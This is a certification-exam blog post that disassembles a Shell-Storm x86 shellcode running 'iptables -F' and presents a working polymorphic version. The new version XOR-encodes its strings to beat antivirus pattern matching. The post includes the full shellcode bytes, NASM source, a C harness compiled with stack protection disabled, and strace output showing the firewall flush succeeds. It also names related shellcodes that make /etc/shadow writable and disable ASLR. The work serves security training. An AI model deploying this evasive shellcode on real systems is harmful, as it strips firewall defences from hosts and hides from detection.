---
title: "SLAE x86 Exam - Assignment #6 Part 3"
date: 2022-01-04
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
  - shellcode
  - polymorphism
  - x86
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 6th assignment requires you to analyze 3 shellcodes from [Shell-Storm](http://shell-storm.org/shellcode/) and "create polymorphic versions of them to beat pattern matching".

There's only 1 constraint:

> The polymorphic versions cannot be larger 150% of the existing shellcode

I chose the following shellcodes:

1. [Linux/x86 - chmod 666 /etc/passwd & /etc/shadow - 57 bytes](http://shell-storm.org/shellcode/files/shellcode-812.php)
2. [Linux/x86 - setuid(0) setgid(0) execve(echo 0 > /proc/sys/kernel/randomize_va_space) - 79 bytes](http://shell-storm.org/shellcode/files/shellcode-222.php)
3. [Linux/x86 - iptables --flush - 43 bytes](http://shell-storm.org/shellcode/files/shellcode-825.php)

In this part I'll create a polymorphic version of the 3rd shellcode.

## Source code

The files for this part of the assignment are the following:

- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm), the original shellcode taken from Shell-Storm
- [polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm), my polymorphic version of the shellcode above
- [test_polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/test_polymorphic_shellcode.nasm), a `C` program for testing the polymorphic shellcode

## Analysis

First, we need to analyse the original shellcode:

```bash
echo -ne "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" > shellcode.bin

ndisasm -b 32 -p intel shellcode.bin
```

Follows the output of `ndisasm`:

```nasm
                            ; clear EAX, setting it to 0x00000000
00000000  31C0              xor eax,eax

                            ; null terminator for the string below
00000002  50                push eax

                            ; string -F
00000003  66682D46          push word 0x462d

                            ; save the pointer to the string into ESI
00000007  89E6              mov esi,esp

                            ; NULL terminator for the string below
00000009  50                push eax

                            ; string ///sbin/iptables
0000000A  68626C6573        push dword 0x73656c62
0000000F  6869707461        push dword 0x61747069
00000014  6862696E2F        push dword 0x2f6e6962
00000019  682F2F2F73        push dword 0x732f2f2f

                            ; save the pointer to the string into EBX
0000001E  89E3              mov ebx,esp

                            ; array of pointers to command-line arguments:
                            ;   - ebx -> pointer to string '///sbin/iptables'
                            ;   - esi -> pointer to string '-F'
                            ;   - eax -> 0x00000000 (null terminator of the array)
00000020  50                push eax
00000021  56                push esi
00000022  53                push ebx
```

So far, the author of this shellcode pushed the string `///sbin/iptables` to the stack, saving its pointer into the register `EBX`, which is going be used by `execve` as the **1st argument** of iptables.

Follows the function prototype of `execve`:

```cpp
int execve(
  // executable to run
  const char *pathname,

  // array of command-line arguments
  char *const argv[],

  // array of environment variables
  char *const envp[]
);
```

In this case `EBX` is `pathname`, i.e. a pointer to a string indicating the executable to run. While `ECX` is a pointer to an array of pointers, terminated by the DWORD `0x00000000`. On the stack, it would look like this:

```nasm
; *ebx -> '///sbin/iptables'
; *esi -> '-F'
; 0x00000000
```

Follows the rest of the disassembly:

```nasm
                            ; 2nd argument of execve:
                            ;   pointer to array of pointers to strings acting as
                            ;   command-line arguments of the program
00000023  89E1              mov ecx,esp

                            ; 3rd argument of execve:
                            ;   pointer to array of pointers to env. variables
00000025  89C2              mov edx,eax

                            ; call execve syscall
00000027  B00B              mov al,0xb
00000029  CD80              int 0x80
```

These instructions use `execve` to run the command `///sbin/iptables -F`.

## Polymorphic shellcode

Follows the polymorphic version of the shellcode:

```nasm
; Title: Linux/x86 - iptables --flush
; Author: Robert C. Raducioiu
; Web: rbct.it
; Reference: http://shell-storm.org/shellcode/files/shellcode-825.php
; Shellcode: "\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x89\xe3\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80"
; Length: 58 bytes

global _start

section .text

_start:

    ; clear EBX, EAX, and EDX
    xor ebx, ebx
    mul ebx
    
    ; instead of pushing EAX, push EDX
    push edx

    ; push word 0x462d
    ; instead of pushing the WORD 0x462d, use two steps
    mov di, 0x462d
    push di

    ; use edi instead of esi
    mov edi,esp
    
    ; use EBX or EDX instead of EAX
    push edx

    ; XOR key ('rbct')
    mov esi, 0x72626374

    ; NULL DWORD acting as the string terminator for
    ;   the path of the executable
    push edx

    push 0x73656c62
    
    push 0x1316131d
    xor [esp], esi

    push 0x2f6e6962

    push 0x014d4c5b
    xor [esp], esi

    ; save the pointer to the string into EBX
    push esp
    pop ebx

    ; instead of 'push eax' use 'push edx', as they are both set to 0x0 
    push edx

    push edi
    push ebx

    mov al, 0xa
    inc eax

    ; use the PUSH-POP technique instead of the MOV instruction
    push esp
    pop ecx

    ; call execve
    int 0x80
```

Now let me describe the changes. First, I've changed the following instructions:

```nasm
global _start

section .text

_start:

    xor eax,eax
    push eax
    push word 0x462d
    mov esi,esp
    push eax
```

Into this:

```nasm
global _start

section .text

_start:

    ; clear EBX, EAX, and EDX
    xor ebx, ebx
    mul ebx
    
    ; instead of pushing EAX, push EDX
    push edx

    ; push word 0x462d
    ; instead of pushing the WORD 0x462d, use two steps
    mov di, 0x462d
    push di
```

Starting from the beginning, instead of clearing only the register `EAX`, I'm also clearing `EBX` and `EDX`. Moreover, instead of using the instruction `push eax`, I'm using `push edx` in order to change the byte of the instruction.

Next, instead of using the instruction `push 0x462d` I chose a two-steps approach, at the cost of adding more bytes to the shellcode.

In particular, I chose to use the `MOV` instruction to copy the WORD `0x462d` into the 16-bits `DI` register, and after that push it to the stack.

After that:

```nasm
    ; use edi instead of esi
    mov edi, esp
  
    ; use EBX or EDX instead of EAX
    push edx
```

Instead of saving the pointer to the string `-F` into the register `ESI`, I'm using the register `EDI`, thus changing the bytes of the shellcode.

Next, I chose to use `push edx` instead of `push eax`, as both these registers are cleared, thus set to `0x00000000`.

Follows the next piece of assembly code to analyse:

```nasm
    ; XOR key ('rbct')
    mov esi, 0x72626374

    ; NULL DWORD acting as the string terminator for
    ;   the path of the executable
    push edx

    push 0x73656c62
    
    push 0x1316131d
    xor [esp], esi

    push 0x2f6e6962

    push 0x014d4c5b
    xor [esp], esi
```

This one differs the most in my opinion, and it's also the reason behind the increment of `11 bytes` compared to the original shellcode.

Given the path of the executable is pushed to the stack in clear-text, an `AntiVirus` product could easily find it, and therefore flag the shellcode as malicious.

Therefore, I decided to make a compromise and XOR two of the most obvious DWORDs:

- `0x61747069` -> "ipta"
- `0x732f2f2f` -> "///s"

One could also XOR the other two DWORDs, based on how many bytes you can add to the shellcode. In this case, the XOR key is the DWORD `0x72626374` (string: `rbct`).

Follows the second-to-last piece of Assembly code:

```nasm
    ; save the pointer to the string into EBX
    push esp
    pop ebx

    ; instead of 'push eax' use 'push edx', as they are both set to 0x0 
    push edx

    push edi
    push ebx
```

Starting from the top, I used the `PUSH-POP` technique, instead of the instruction `mov ebx, esp`, as it changes the resulting bytes, while using the same numer of bytes.

Next, I've repeated what I've already done before: use `push edx` instead of `push eax`, because they are both set to `0x00000000`.

The instructions `push edi` and `push ebx` aren't too different from the original shellcode, I had to use the register `edi` because I've changed it previously, storing the pointer to the string `-F` into `EDI` instead of `ESI`.

Finally, it's time to analyse the last piece of Assembly code:

```nasm
    mov al, 0xa
    inc eax

    ; use the PUSH-POP technique instead 'mov ecx, esp'
    push esp
    pop ecx

    ; call execve
    int 0x80
```

At the end of the original shellcode there's the instruction `mov al, 0xb`. I chose to split it into two instructions (`mov al, 0xa` and `inc eax`), as it adds only one byte more compared to the original shellcode.

I also changed the position inside the shellcode: instead of placing the instructions at the end, I placed them before other instructions, in order to evade pattern matching.

Next, I replaced the instruction `mov ecx,esp` with two instructions, using the `PUSH-POP` technique.

Compared to the original shellcode, I didn't have to clear EDX, as it was already cleared from the start (by means of `mul ebx`).

The last instruction is identical to the one from the original shellcode.

### Testing

To test the polymorphic shellcode, I've used the following C program:

```cpp
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80";

main()
{
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
```

To compile:

```bash
gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
```

Once I've run it, I could confirm it executes `iptables -F` successfully:

```bash
rbct@slae:~/exam/assignment_6/3$ sudo strace -e trace=execve ./test_polymorphic_shellcode 
# execve("./test_polymorphic_shellcode", ["./test_polymorphic_shellcode"], [/* 16 vars */]) = 0
# Shellcode length: 58
# execve("///sbin/iptables", ["///sbin/iptables", "-F"], [/* 0 vars */]) = 0

rbct@slae:~/exam/assignment_6/3$
```

As you can see, it confirms the length of the shellcode is `58 bytes`. More important is the last `execve` syscall. It executed the command `///sbin/iptables -F` and returned `0`, meaning it succeeded.
